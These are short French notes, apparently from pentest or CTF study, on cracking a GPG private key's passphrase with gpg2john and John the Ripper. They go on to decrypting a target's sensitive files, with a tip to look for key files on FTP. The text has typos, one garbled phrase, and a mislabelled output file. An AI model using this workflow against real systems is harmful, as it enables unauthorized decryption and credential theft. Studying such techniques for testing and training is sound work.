En cryptographie, une clé privée est une string qui permet de déchiffrer la donnée chiffrée par une clée publique.
 les passphrases, qui servent de "mot de passe" pour les clés cryptographiques.
 Cependant, on peutextraire le h la passphrase a partir du fichier de la clé en utilisant la commande:
 ```bash
 gpg2john 'target_key' > 'output.txt'
 ```
 Ici, 'target_key' designe la clée a cracker, et 'output.txt' est le fichier dans lequel la sortie du crack sera sauvegardée.
 ```bash
 john 'output.txt'
 ```
 Une fois obtenue, la passphrase peut être utilisée pour déchiffrer des données sensibles avec la clé privée, tel que les mots de passe hashés des utilisateurs.
 ```bash
  gpg --import 'target_key'
  gpg --decrypt 'sensitive_file'
 ```
 **Conseil** : Vérifier si il existe un dossier comportant des fichiers comme ``` private.asc``` et/ou ``` backup.pgp``` lorsque la cible tourne sur ftp.


En somme, le workflow est: crack du hash de la passphrase--> déchiffrement de la passphrase-->déchiffrement de fichiers sensibles-->utilisation de john ou hashcat pour casser les hashes.
